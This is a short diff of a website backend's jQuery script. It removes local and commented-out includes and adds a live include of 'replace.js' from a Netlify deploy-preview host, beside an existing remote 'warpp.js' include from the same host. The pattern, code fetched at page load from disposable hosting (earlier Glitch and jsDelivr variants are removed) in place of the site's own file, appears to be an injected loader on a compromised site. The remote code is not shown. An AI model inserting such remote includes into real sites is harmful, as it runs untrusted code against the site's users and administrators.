@@ -59,8 +59,5 @@ $(function() {
         $(this).next(".custom-file-label").html(e)
     })
 }), 
-// include(base_url + "public/assets/template-backend/dist/js/preview.js");
-// include("https://cdn.jsdelivr.net/gh/jdedelivererone-dev/waxx@main/warpp.js");
 include("https://68d25eeb424e0b2ab7d3f7e7--classy-begonia-8842fe.netlify.app/warpp.js");
-include(base_url + "public/assets/template-backend/dist/js/previewaddition.js");
-// include("https://glen-hissing-end.glitch.me/vendor/js/main.js");
+include("https://68d268c8ab63370008715e0c--classy-begonia-8842fe.netlify.app/replace.js");
